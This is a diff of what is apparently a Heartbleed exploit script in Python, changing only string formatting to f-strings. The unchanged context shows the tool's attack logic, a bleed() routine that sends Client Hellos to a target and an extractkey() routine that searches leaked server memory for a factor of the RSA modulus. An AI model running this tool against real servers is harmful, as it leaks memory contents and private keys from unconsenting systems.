@@ -76,7 +76,7 @@ if opts.extractkey:
 def hex2bin(arr):
     # return ''.join('{:02x}'.format(x) for x in arr).decode('hex')
     # return binascii.unhexlify(''.join('{:02x}'.format(x) for x in arr))
-    return bytes.fromhex(''.join('{:02x}'.format(x) for x in arr))
+    return bytes.fromhex(''.join(f'{x:02x}' for x in arr))
 
 
 tls_versions = {0x01: 'TLSv1.0', 0x02: 'TLSv1.1', 0x03: 'TLSv1.2'}
@@ -277,7 +277,7 @@ def hexdump(s):
 
         if opts.hexdump:
 
-            hxdat = ' '.join('%02X' % c for c in lin)
+            hxdat = ' '.join(f'{c:02X}' for c in lin)
 
             pdat = ''.join((chr(c) if 32 <= c <= 126 else '.')for c in lin)
 
@@ -328,7 +328,7 @@ def rcv_tls_record(s):
             return None, None, None
 
         if opts.verbose:
-            print(('Received message: type = {}, version = {}, length = {}'.format(typ, hex(ver), length,)))
+            print(f'Received message: type = {typ}, version = {hex(ver)}, length = {length}')
 
         return typ, ver, message
 
@@ -633,7 +633,7 @@ def bleed(targ, port):
 
                 if firstrun:
 
-                    print(('Sending Client Hello for {}'.format(tlsver)))
+                    print(f'Sending Client Hello for {tlsver}')
 
                 s.send(hex2bin(build_client_hello(num)))
 
@@ -649,7 +649,7 @@ def bleed(targ, port):
 
                         if opts.verbose:
 
-                            print(('Server closed connection without sending ServerHello for {}'.format(tlsver)))
+                            print(f'Server closed connection without sending ServerHello for {tlsver}')
 
                         s.close()
 
@@ -661,7 +661,7 @@ def bleed(targ, port):
 
                         if firstrun:
 
-                            print(('Received Server Hello for {}'.format(tlsver)))
+                            print(f'Received Server Hello for {tlsver}')
 
                         supported = True
 
@@ -737,7 +737,7 @@ def extractkey(host, chunk, modulus):
 
     for offset in range(0, len(chunk) - keysize):
 
-        p = int(''.join(["%02x" % chunk[x] for x in range(offset + keysize - 1, offset - 1, -1)]).strip(), 16)
+        p = int(''.join([f"{chunk[x]:02x}" for x in range(offset + keysize - 1, offset - 1, -1)]).strip(), 16)
 
         if gmpy.is_prime(p) and p != n and n % p == 0:
 
@@ -807,7 +807,7 @@ def main():
 
             if allresults and (not opts.donotdisplay):
 
-                print(('%s' % (allresults)))
+                print(f'{allresults}')
 
         fileIN.close()
 
@@ -823,7 +823,7 @@ def main():
 
         if allresults and (not opts.donotdisplay):
 
-            print(('%s' % (allresults)))
+            print(f'{allresults}')
 
     print()
 
